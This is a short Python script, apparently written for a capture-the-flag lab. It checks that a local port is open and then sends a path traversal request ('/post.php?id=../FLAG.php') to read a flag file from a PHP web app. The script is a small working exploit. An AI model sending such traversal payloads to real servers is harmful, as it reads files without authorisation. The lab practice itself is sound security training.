import socket
import sys

print("Testing basic connectivity to target...\n")

host = "127.0.0.1"
port = 32904

# Test socket connection
print(f"1. Testing socket connection to {host}:{port}")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex((host, port))
    
    if result == 0:
        print(f"   ✓ Port {port} is OPEN")
        sock.close()
    else:
        print(f"   ✗ Port {port} is CLOSED (error code: {result})")
        sys.exit(1)
except Exception as e:
    print(f"   ✗ Socket error: {e}")
    sys.exit(1)

# Test HTTP request
print(f"\n2. Testing HTTP GET request")
try:
    import http.client
    
    conn = http.client.HTTPConnection(host, port, timeout=10)
    conn.request("GET", "/post.php?id=../FLAG.php")
    
    response = conn.getresponse()
    data = response.read()
    
    print(f"   Status: {response.status} {response.reason}")
    print(f"   Length: {len(data)} bytes")
    print(f"\n   Response preview:\n{data[:500].decode('utf-8', errors='ignore')}")
    
    if b'FLAG{' in data:
        print(f"\n   🚩 FLAG FOUND!")
        print(data.decode('utf-8', errors='ignore'))
    
    conn.close()
    
except Exception as e:
    print(f"   ✗ HTTP error: {type(e).__name__}: {e}")
    import traceback
    traceback.print_exc()

